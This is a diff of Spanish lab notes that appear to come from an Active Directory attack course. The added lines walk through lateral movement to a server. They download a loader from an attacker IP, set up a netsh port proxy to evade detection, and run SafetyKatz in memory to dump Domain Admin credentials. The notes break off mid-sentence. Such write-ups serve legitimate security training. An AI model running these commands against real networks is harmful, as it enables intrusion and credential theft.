@@ -87,7 +87,7 @@ Ahora enumeraremos a todos aquellos usuarios logados en el dominio y tienen sesi
 Find-DomainUserLocation
 ```
 
-viendo que hay una sesion de Domain Asmin en el servidor *dcorp-mgmt* del cual nos podemos aprovechar usando *winrs* para poder ejecutar en la maquina una orden la cual nos de el nombre del equipo y usuario
+viendo que hay una sesión de Domain Asmin en el servidor *dcorp-mgmt* del cual nos podemos aprovechar usando *winrs* para poder ejecutar en la maquina una orden la cual nos de el nombre del equipo y usuario
 ```shell
  winrs -r:dcorp-mgmt cmd /c "set computername && set username"
 ```
@@ -99,14 +99,23 @@ Primero lo descargamos en *dcorp-ci*
 iwr http://172.16.100.97/Loader.exe -OutFile C:\Users\Public\Loader.exe
 ```
 
-Una vez lo tenemos aqui lo teransferiremos a *dcorp-mgmt*
+Una vez lo tenemos aquí lo transferiremos a *dcorp-mgmt*
 ```shell
 echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
-Ahora volveremos a poder usar *winrs* para poder ejecutarlo en el equipo de *dcorp-mgmt*, en este caso para poder evitar la deteccion en el dominio haremos un reenvio de puertos a t
+Ahora volveremos a poder usar *winrs* para poder ejecutarlo en el equipo de *dcorp-mgmt*, en este caso para poder evitar la detección en el dominio haremos un reenvió de puertos a t
 ```shell
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.67"
 ```
 
-Haciendo que la maquina objetivo escuche en el puerto *8080* y reenvie el trafico al *80* de nuestra maquina atacante
+Haciendo que la maquina objetivo escuche en el puerto *8080* y reenvié el trafico al *80* de nuestra maquina atacante
+
+Usamos *$null* para solucionar problemas a la redirección de salida
+Para poder ejecutar ahora *SafetyKatz* en *dcorp-mgmt*, lo descagamos y ejecutamos en memoria usando el *Loader*
+```shell
+$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
+```
+
+Dandonos como respuesta las credenciales del *svcadmin* que es Domain Admin
+Al ser esta una cuenta de servicio que se puede saber al ver que pone 
